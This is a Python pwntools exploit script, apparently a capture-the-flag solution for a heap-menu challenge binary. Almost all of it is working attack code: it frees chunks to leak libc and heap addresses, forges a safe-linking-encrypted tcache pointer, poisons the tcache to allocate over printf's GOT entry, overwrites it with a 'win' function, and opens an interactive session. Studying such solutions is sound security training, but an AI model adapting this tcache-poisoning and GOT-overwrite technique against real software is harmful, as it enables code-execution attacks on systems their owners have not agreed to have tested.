from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
r = ROP(e)
libc = ELF('./libc.so.6', checksec=False)

gs = '''
set resolve-heap-via-heuristic on
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


def allocate(slot, sz):
    log.info('Allocating %i,%i' % (slot, sz))
    p.recvuntil(b'Option:')
    p.sendline(b'1')
    p.recvuntil(b'Slot:')
    p.sendline(b'%i' % slot)
    p.recvuntil(b'Size:')
    p.sendline(b'%i' % sz)


def edit(slot, content):
    log.info('Editing slot: %i with %s' % (slot, content))
    p.recvuntil(b'Option:')
    p.sendline(b'2')
    p.recvuntil(b'Slot:')
    p.sendline(b'%i' % slot)
    p.recvuntil(b'content:')
    p.sendline(content)


def free(slot):
    log.info('Freeing slot: %i' % slot)
    p.recvuntil(b'Option:')
    p.sendline(b'3')
    p.recvuntil(b'Slot:')
    p.sendline(b'%i' % slot)


def view(slot):
    p.recvuntil(b'Option:')
    p.sendline(b'4')
    p.recvuntil(b'Slot:')
    p.sendline(b'%i' % slot)
    return p.recvline()


def leak(slot):
    leak = view(slot).lstrip(b' ').rstrip(b'\n')
    try:
        leak = u64(leak+b'\x00'*(8-len(leak)))
        log.info("Leaking slot: %i with %s" % (slot, hex(leak)))
        return leak
    except:
        return 0


def terminate():
    log.info('terminate')
    p.recvuntil(b'Option:')
    p.sendline(b'5')


p = start()
for i in range(0, 10):
    allocate(i, 128)

for i in range(0, 10):
    free(i)

bin0_leak = leak(0)
bin1_leak = leak(1)
bin7_leak = leak(7)

libc.address = bin7_leak-0x219ce0
heap_leak = (bin0_leak ^ bin1_leak)

log.info("Libc Leak Found: %s" % hex(libc.address))
log.info("Tcache Leak Found: %s" % hex(heap_leak))

log.info("0x%x (Malloc) & 0f == 0x%x " %
         (e.got['malloc'], (e.got['malloc']) & 0xf))
log.info("0x%x (Printf) & 0f == 0x%x " %
         (e.got['printf'], (e.got['printf']) & 0xf))
log.info("Ovewriting with printf because e.got['printf'] & 0xf == 0x0")
overwrite_addr = e.got['printf']

encrypted_ptr = (bin0_leak ^ overwrite_addr)

edit(6, p64(encrypted_ptr))
pause()

allocate(0, 128)
pause()

allocate(1, 128)
pause()

edit(1, p64(e.sym['win']))

p.interactive()
